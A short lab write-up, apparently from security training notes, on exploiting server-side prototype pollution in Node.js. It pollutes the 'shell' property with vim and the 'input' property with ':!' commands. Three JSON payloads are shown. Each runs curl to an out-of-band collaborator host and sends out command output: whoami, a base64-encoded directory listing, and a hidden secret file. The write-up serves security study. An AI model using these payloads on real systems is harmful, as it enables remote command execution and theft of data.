# Lab 9 - Vim Technique & B64

This lab is similar to Lab 8 but this time the usual `execArgv` property payload won't work. We will utilize the `vim` this time.

This is the payload:

```json
"__proto__":{
	"shell":"vim",
	"input":":! curl https://gcw2kk6asiji226oj9s90d2zxq3hr9fy.oastify.com -d $(whoami)\n"
}
```

The second catch was, the `stdout` was not showing everything, we only get a certain amount of it. For this, we will encode the output in `base64` in the bash command

```json
"__proto__":{
	"shell":"vim",
	"input":":! curl https://gcw2kk6asiji226oj9s90d2zxq3hr9fy.oastify.com -d $(ls | base64)\n"
}
```

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Decode it and we found a hidden file `secret`

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Now just `cat` it with `base64` and decode it

```json
"__proto__":{
	"shell":"vim",
	"input":":! curl https://gcw2kk6asiji226oj9s90d2zxq3hr9fy.oastify.com -d $(cat secret | base64)\n"
}
```

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
